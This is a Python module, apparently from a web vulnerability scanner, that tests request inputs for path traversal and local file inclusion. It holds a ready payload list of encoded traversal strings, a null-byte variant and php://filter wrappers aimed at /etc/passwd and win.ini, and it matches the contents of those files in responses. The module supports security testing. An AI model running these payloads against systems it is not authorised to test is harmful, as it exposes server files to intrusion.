import argparse
import base64
import binascii
from dataclasses import replace
from pathlib import Path
import re

from core.probes import input_variants
from core.tooltags import BurpTool
from modules.base import BaseModule


# Test readable files with recognizable contents rather than interpreting
# generic include errors or HTTP status changes as successful file access.
_DEFAULT_PAYLOADS = ['/etc/passwd', r'C:\Windows\win.ini']
for _depth in (1, 3, 6, 10):
    _DEFAULT_PAYLOADS.extend([
        '../' * _depth + 'etc/passwd',
        '..\\' * _depth + r'Windows\win.ini',
        '%2e%2e%2f' * _depth + 'etc/passwd',
        '%252e%252e%252f' * _depth + 'etc/passwd',
        '....//' * _depth + 'etc/passwd',
    ])
_DEFAULT_PAYLOADS.extend([
    '/etc/passwd%00',
    'file:///etc/passwd',
    'php://filter/convert.base64-encode/resource=/etc/passwd',
])
_PASSWD = re.compile(r'(?m)(?:^|[>\n])root:[^:\r\n<]*:0:0:[^:\r\n<]*:[^:\r\n<]*:/[^:\r\n<]+(?=\r?$|<)')
_WINDOWS_SECTIONS = re.compile(r'(?im)(?:^|[>\n])[ \t]*\[(fonts|extensions|mci extensions|files|windows)\][ \t]*(?=\r?$|<)')
_BASE64 = re.compile(r'(?<![A-Za-z0-9+/])[A-Za-z0-9+/]{32,}={0,2}(?![A-Za-z0-9+/=])')


class Traversal(BaseModule):
    """Payload-based path traversal and local file inclusion checks."""

    tool = BurpTool.INTRUDER
    follow_redirects = False
    path_options = {'--traversal-payloads': 'file'}

    def __init__(self):
        self._payloads = list(_DEFAULT_PAYLOADS)
        self._markers = []
        self._decode_base64 = True

    def option_parser(self):
        parser = argparse.ArgumentParser(prog='traversal', add_help=False, allow_abbrev=False)
        parser.add_argument('--traversal-payloads', metavar='FILE',
                            help='UTF-8 payload file, one per nonblank line; replaces built-in Linux/Windows/LFI probes')
        parser.add_argument('--traversal-marker', metavar='TEXT', action='append', default=[],
                            help='Literal expected contents of a controlled test file (repeatable)')
        return parser

    def setup(self, args):
        parsed, _ = self.option_parser().parse_known_args(args)
        self._payloads = list(_DEFAULT_PAYLOADS)
        self._markers = parsed.traversal_marker
        if any(not marker.strip() for marker in self._markers):
            raise ValueError('traversal markers must not be empty')
        if parsed.traversal_payloads:
            self._payloads = [line for line in Path(parsed.traversal_payloads).read_text(encoding='utf-8').splitlines() if line.strip()]
            if not self._payloads:
                raise ValueError('traversal: payload file is empty')
        self._decode_base64 = any('convert.base64-encode' in payload.lower() for payload in self._payloads)

    def _plain_signatures(self, text):
        signatures = set()
        if _PASSWD.search(text):
            signatures.add('unix-passwd')
        if len(set(section.lower() for section in _WINDOWS_SECTIONS.findall(text))) >= 2:
            signatures.add('windows-win.ini')
        for index, marker in enumerate(self._markers):
            if marker in text:
                signatures.add(f'custom-marker-{index + 1}')
        return signatures

    def _signatures(self, body):
        text = body.decode('utf-8', 'replace')
        signatures = self._plain_signatures(text)
        # PHP filter responses can embed the encoded file inside an HTML page.
        if self._decode_base64:
            for match in _BASE64.finditer(text):
                try:
                    decoded = base64.b64decode(match.group(), validate=True).decode('utf-8', 'replace')
                except (ValueError, binascii.Error):
                    continue
                signatures.update('base64:' + name for name in self._plain_signatures(decoded))
        return signatures

    async def mutate(self, requests, context):
        def variants():
            for index, request in enumerate(requests):
                count = sum(1 for _ in input_variants(request, ''))
                if not count:
                    continue
                total = 1 + count * len(self._payloads)
                yield replace(request, metadata={**request.metadata,
                    'traversal': (index, None, None, None, total)})
                for payload in self._payloads:
                    for location, name, variant in input_variants(request, payload):
                        yield replace(variant, metadata={**variant.metadata,
                            'traversal': (index, location, name, payload, total)})
        return variants()

    async def analyze_one(self, response, context):
        meta = response.request.metadata.get('traversal')
        if meta is None:
            return
        index, location, name, payload, total = meta
        results = context.state.setdefault('traversal.results', {})
        entry = results.setdefault(index, {'remaining': total, 'baseline': set(), 'baseline_status': 0, 'hits': []})
        signatures = self._signatures(response.body) if response.status else set()
        if location is None:
            entry['baseline'] = signatures
            entry['baseline_status'] = response.status
        elif signatures:
            entry['hits'].append((replace(response, body=b'', traffic=[]), location, name, payload, signatures))
        entry['remaining'] -= 1
        if entry['remaining'] == 0:
            try:
                if entry['baseline_status']:
                    for hit, location, name, payload, signatures in entry['hits']:
                        # Encoding alone must not turn existing file contents
                        # into a new finding; also reject payload echo evidence.
                        known = {name.removeprefix('base64:') for name in
                                 entry['baseline'] | self._signatures(payload.encode())}
                        added = {name for name in signatures if name.removeprefix('base64:') not in known}
                        if added:
                            self.report(hit, context,
                                f'[TRAVERSAL] File-content indicator via {location} {name}: {", ".join(sorted(added))}',
                                evidence={'parameter': name, 'location': location, 'payload': payload,
                                          'signatures': sorted(added), 'baseline_status': entry['baseline_status']},
                                confidence='indicator')
            finally:
                del results[index]
